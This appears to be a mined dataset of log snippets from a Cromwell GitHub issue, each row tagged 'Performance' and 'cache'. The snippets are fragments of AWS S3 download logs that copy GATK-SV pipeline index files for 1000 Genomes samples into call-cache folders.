focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-29/cacheCopy/SR00c.HG01396.txt.gz.tbi; 1608597492748,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-53/cacheCopy/SR00c.HG02235.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-53/cacheCopy/SR00c.HG02235.txt.gz.tbi; 1608597495158,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/E",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:153105,cache,cacheCopy,153105,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"1bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-60/cacheCopy/SR00c.HG02489.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-60/cacheCopy/SR00c.HG02489.txt.gz.tbi; 1608597475239,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-36/cacheCopy/SR00c.HG01790.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-36/cacheCopy/SR00c.HG01790.txt.gz.tbi; 1608597478676,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-136/cacheCopy/SR00c.NA19684.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-136/cacheCopy/SR00c.NA19684.txt.gz; 1608597480242,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/Evidenc",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:148143,cache,cacheCopy,148143,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"1bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-61/cacheCopy/SR00c.HG02490.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-61/cacheCopy/SR00c.HG02490.txt.gz.tbi; 1608597386501,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-89/cacheCopy/SR00c.HG03709.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-89/cacheCopy/SR00c.HG03709.txt.gz.tbi; 1608597387962,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-119/cacheCopy/SR00c.NA18945.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-119/cacheCopy/SR00c.NA18945.txt.gz.tbi; 1608597391284,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:121919,cache,cacheCopy,121919,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"1bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-64/cacheCopy/SR00c.HG02588.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-64/cacheCopy/SR00c.HG02588.txt.gz.tbi; 1608597040452,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-74/cacheCopy/SR00c.HG03085.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-74/cacheCopy/SR00c.HG03085.txt.gz.tbi; 1608597042942,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-73/cacheCopy/SR00c.HG03009.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-73/cacheCopy/SR00c.HG03009.txt.gz; 1608597045131,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceM",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:27796,cache,cacheCopy,27796,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"1bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-65/cacheCopy/SR00c.HG02611.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-65/cacheCopy/SR00c.HG02611.txt.gz.tbi; 1608596996095,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-56/cacheCopy/SR00c.HG02299.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-56/cacheCopy/SR00c.HG02299.txt.gz.tbi; 1608596998999,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-133/cacheCopy/SR00c.NA19661.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-133/cacheCopy/SR00c.NA19661.txt.gz; 1608597001436,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/Evidenc",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:16580,cache,cacheCopy,16580,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"1bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-77/cacheCopy/SR00c.HG03111.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-77/cacheCopy/SR00c.HG03111.txt.gz.tbi; 1608597384680,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-61/cacheCopy/SR00c.HG02490.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-61/cacheCopy/SR00c.HG02490.txt.gz.tbi; 1608597386501,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-89/cacheCopy/SR00c.HG03709.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-89/cacheCopy/SR00c.HG03709.txt.gz.tbi; 1608597387962,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/E",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:121292,cache,cacheCopy,121292,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"1bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-80/cacheCopy/SR00c.HG03436.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-80/cacheCopy/SR00c.HG03436.txt.gz.tbi; 1608596974147,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-95/cacheCopy/SR00c.HG03850.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-95/cacheCopy/SR00c.HG03850.txt.gz.tbi; 1608596976528,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-75/cacheCopy/SR00c.HG03099.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-75/cacheCopy/SR00c.HG03099.txt.gz; 1608596979652,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceM",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:10350,cache,cacheCopy,10350,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"1bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-85/cacheCopy/SR00c.HG03604.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-85/cacheCopy/SR00c.HG03604.txt.gz.tbi; 1608597270319,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-23/cacheCopy/SR00c.HG01275.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-23/cacheCopy/SR00c.HG01275.txt.gz.tbi; 1608597272885,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-107/cacheCopy/SR00c.NA12489.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-107/cacheCopy/SR00c.NA12489.txt.gz; 1608597275740,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/Evidenc",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:90755,cache,cacheCopy,90755,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"1bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-87/cacheCopy/SR00c.HG03684.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-87/cacheCopy/SR00c.HG03684.txt.gz.tbi; 1608597297393,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-99/cacheCopy/SR00c.HG04118.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-99/cacheCopy/SR00c.HG04118.txt.gz.tbi; 1608597299791,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-21/cacheCopy/SR00c.HG01085.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-21/cacheCopy/SR00c.HG01085.txt.gz; 1608597301211,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceM",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:97602,cache,cacheCopy,97602,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"1bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-9/cacheCopy/SR00c.HG00337.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-9/cacheCopy/SR00c.HG00337.txt.gz.tbi; 1608597545740,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-107/cacheCopy/SR00c.NA12489.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-107/cacheCopy/SR00c.NA12489.txt.gz.tbi; 1608597548876,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-135/cacheCopy/SR00c.NA19679.txt.gz to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-135/cacheCopy/SR00c.NA19679.txt.gz; 1608597550096,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/Eviden",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:169586,cache,cacheCopy,169586,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
Performance,"1bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-90/cacheCopy/SR00c.HG03722.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-90/cacheCopy/SR00c.HG03722.txt.gz.tbi; 1608597210297,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-18/cacheCopy/SR00c.HG00740.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-18/cacheCopy/SR00c.HG00740.txt.gz.tbi; 1608597211840,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-135/cacheCopy/SR00c.NA19679.txt.gz.tbi to focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging/EvidenceMerging/4eaf013d-9a23-49ef-bd67-4e88965c2e01/call-SetSampleIdSR/shard-135/cacheCopy/SR00c.NA19679.txt.gz.tbi; 1608597213995,download: s3://focal-gwf-core/cromwell-execution/GATKSVPipelineSingleSample/41bca0c7-e664-486c-8c40-52fd6cfb0636/call-Module00c/Module00c/7d4766c9-ce90-47ed-b14e-7c68055d8b1c/call-EvidenceMerging",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6141:74537,cache,cacheCopy,74537,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6141,1,['cache'],['cacheCopy']
